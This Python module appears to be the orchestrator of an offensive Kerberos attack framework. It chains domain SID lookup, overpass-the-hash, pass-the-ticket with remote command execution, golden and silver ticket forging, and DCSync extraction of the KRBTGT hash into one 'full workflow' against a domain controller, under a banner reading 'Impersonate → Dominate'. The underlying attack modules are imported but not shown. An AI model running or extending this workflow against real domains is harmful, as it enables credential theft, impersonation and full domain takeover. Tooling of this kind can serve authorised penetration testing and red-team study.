"""
TicketAttackFramework — Main orchestrator for Kerberos ticket attacks.

Coordinates: SID lookup → Overpass-the-Hash → Pass-the-Ticket →
Golden Ticket → Silver Ticket → Diamond Ticket → Reporting
"""

from pathlib import Path

from .sid_resolver import SIDResolver
from ..attacks.overpass import OverpassTheHash
from ..attacks.pass_ticket import PassTheTicket
from ..attacks.golden import GoldenTicket
from ..attacks.silver import SilverTicket
from ..attacks.diamond import DiamondTicketGuidance
from ..utils.ticket_utils import DCSync
from ..utils.reporting import ReportGenerator
from ..utils.commands import CommandReference


class TicketAttackFramework:
    """
    Complete framework for Kerberos ticket-based attacks:

    1. Overpass-the-Hash: NTLM hash → Kerberos TGT
    2. Pass-the-Ticket: Inject stolen/forged tickets
    3. Golden Ticket: Forge TGTs with KRBTGT hash
    4. Silver Ticket: Forge service tickets with service hash
    5. Diamond Ticket: Modify legitimate TGTs
    """

    def __init__(self, domain: str, dc_ip: str, output_dir: str = "ticket_attacks"):
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.domain_sid = ""

        # Sub-components
        self.sid_resolver = SIDResolver(domain, dc_ip)
        self.overpass = OverpassTheHash(domain, dc_ip, self.output_dir)
        self.ptt = PassTheTicket(domain)
        self.diamond = DiamondTicketGuidance(domain, dc_ip)
        self.dcsync = DCSync(domain, dc_ip, self.output_dir)
        self.reporter = ReportGenerator(domain, dc_ip, self.output_dir)

        self._print_banner()

    def _print_banner(self):
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║       PASS-THE-TICKET & OVERPASS-THE-HASH FRAMEWORK         ║
║                                                              ║
║  Hash → Ticket → Impersonate → Dominate                      ║
╚══════════════════════════════════════════════════════════════╝
[+] Domain:  {self.domain}
[+] DC:      {self.dc_ip}
[+] Output:  {self.output_dir}
        """)

    # ── Delegating methods ──────────────────────────────────────

    def get_domain_sid(
        self, username: str, password: str = "", ntlm_hash: str = ""
    ) -> str:
        self.domain_sid = self.sid_resolver.resolve(username, password, ntlm_hash)
        return self.domain_sid

    def overpass_the_hash(
        self, username: str, ntlm_hash: str = "",
        aes256_key: str = "", password: str = "",
    ) -> str:
        return self.overpass.execute(username, ntlm_hash, aes256_key, password)

    def pass_the_ticket(
        self, ccache_file: str, target: str,
        username: str, command: str = "whoami",
    ) -> bool:
        return self.ptt.execute(ccache_file, target, username, command)

    def golden_ticket(
        self, username: str, user_id: int, krbtgt_hash: str,
        krbtgt_aes256: str = "", groups: str = "", duration: int = 0,
    ) -> str:
        gt = GoldenTicket(self.domain, self.dc_ip, self.domain_sid, self.output_dir)
        return gt.forge(username, user_id, krbtgt_hash, krbtgt_aes256, groups, duration)

    def silver_ticket(
        self, username: str, service_hash: str, service_spn: str,
        target_host: str, service_aes256: str = "", user_id: int = 500,
    ) -> str:
        st = SilverTicket(self.domain, self.domain_sid, self.output_dir)
        return st.forge(
            username, service_hash, service_spn, target_host, service_aes256, user_id
        )

    def diamond_ticket_guidance(self, krbtgt_aes256: str = ""):
        self.diamond.print_guidance(krbtgt_aes256)

    def export_tickets_windows(self):
        CommandReference.print_export_guidance(self.domain)

    def dcsync_for_krbtgt(
        self, username: str, password: str = "", ntlm_hash: str = ""
    ):
        self.dcsync.extract_krbtgt(username, password, ntlm_hash)

    def generate_report(self):
        self.reporter.generate(self.domain_sid)

    # ── Full workflow ───────────────────────────────────────────

    def run_full_workflow(
        self, username: str, password: str = "", ntlm_hash: str = "",
        krbtgt_hash: str = "", krbtgt_aes256: str = "", target: str = "",
    ):
        """Execute the complete ticket attack workflow."""
        print(f"\n{'#' * 60}")
        print(f"# TICKET ATTACK WORKFLOW")
        print(f"# Domain: {self.domain}")
        print(f"{'#' * 60}")

        target = target or self.dc_ip

        # Step 1: Get Domain SID
        self.get_domain_sid(username, password, ntlm_hash)

        # Step 2: Overpass-the-Hash
        ccache = ""
        if ntlm_hash or password:
            ccache = self.overpass_the_hash(
                username, ntlm_hash=ntlm_hash, password=password
            )

        # Step 3: Pass-the-Ticket
        if ccache:
            self.pass_the_ticket(ccache, target, username)

        # Step 4: Golden Ticket (if KRBTGT available)
        if krbtgt_hash and self.domain_sid:
            self.golden_ticket("Administrator", 500, krbtgt_hash, krbtgt_aes256)

        # Step 5: Diamond Ticket guidance
        if krbtgt_aes256:
            self.diamond_ticket_guidance(krbtgt_aes256)

        # Step 6: Export guidance
        self.export_tickets_windows()

        # Report
        self.generate_report()